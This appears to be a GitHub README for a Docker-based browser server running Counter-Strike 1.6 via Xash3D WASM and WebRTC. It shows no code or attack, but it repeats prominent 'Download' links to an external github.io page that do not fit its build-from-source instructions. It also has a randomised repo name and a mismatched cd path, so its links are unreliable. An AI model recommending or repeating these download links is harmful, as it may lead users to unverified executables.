# CS 1.6 Web v1 - browser-based game server 2026

> **Play Counter-Strike 1.6 in a web browser for LAN sessions with a Docker-based server, WebRTC connectivity, and Xash3D WASM in version 1.**  

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/neumannfabian1993/cs16-web-map-server-win-13861?style=flat-square)](https://github.com/neumannfabian1993/cs16-web-map-server-win-13861)

---

<p align="center">
  <a href="https://neumannfabian1993.github.io/cs16-web-map-server-win-13861/">
    <img src="https://img.shields.io/badge/Download-CS%201.6%20Web%20Latest-brightgreen?style=for-the-badge" alt="Download CS 1.6 Web">
  </a>
</p>

> **[Direct Download - CS 1.6 Web v1](https://neumannfabian1993.github.io/cs16-web-map-server-win-13861/)**

---

[Download Latest Build](https://neumannfabian1993.github.io/cs16-web-map-server-win-13861/)

---

## About CS 1.6 Web

CS 1.6 Web is a browser-based game server for Counter-Strike 1.6 designed for LAN multiplayer sessions. It combines Docker deployment with WebRTC transport so players can open a link and connect from a web browser instead of installing a separate client.

The project uses Xash3D compiled to WebAssembly and includes browser-side map selection plus support for custom .bsp maps. It is a practical fit for local game setups where you want a single-container service, simple sharing, and configurable behavior through environment variables.

---

## Features

- Runs Counter-Strike 1.6 in a web browser over LAN
- Uses a single Docker container for deployment
- Connects players through WebRTC peer-to-peer communication
- Relies on Xash3D compiled to WebAssembly
- Provides browser-based map selection
- Supports custom .bsp maps
- Does not require client installation on joining devices
- Exposes game settings through environment variables

---

## Installation

Clone the repository or download the source, then build and start the container from the project directory.

1. Get the files:
   - `git clone https://github.com/neumannfabian1993/cs16-web-map-server-win-13861.git
   - `cd cs16-web-map-server`

2. Start the service with Docker:
   - `docker compose up -d`
   - or `docker run` with the provided container settings if you prefer a direct launch

3. Open the web interface from the host or shared LAN link and launch the server session.

---

## Usage

After the container is running, open the browser interface to select a map and begin a multiplayer session.

Typical workflow:
- Start the Docker container
- Choose a map in the browser UI
- Share the generated link with other players on the LAN
- Let players join through their browsers
- Replace or add `.bsp` maps when you want a different rotation

If you are automating deployment, keep the container running and update the environment variables before restarting the service.

---

## Configuration

Most settings are controlled through environment variables passed to the container.

Example:

``
GAME_NAME=LAN Session
MAP=de_dust2
MAX_PLAYERS=16
``

Map files are handled by the server and browser UI, so custom `.bsp` content should be placed where the container expects it. Review the compose file or container startup command for the exact variable names used in your setup.

---

## Requirements

- Docker
- A host that can run a single-container game server
- A web browser on the host and joining devices
- LAN connectivity for local multiplayer use
- Space for game assets and custom `.bsp` maps

---

## FAQ

**How do players join?**  
They open the shared browser link from a device on the same network.

**Can I change the map?**  
Yes. The browser interface supports map selection and custom `.bsp` maps.

**Where do I change server options?**  
Use the container environment variables before starting or restarting the service.

**What if the server does not start correctly?**  
Check Docker logs first, then verify that the required ports, files, and map assets are available.

**How are updates handled?**  
Pull the latest repository changes, rebuild the container, and restart the service.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
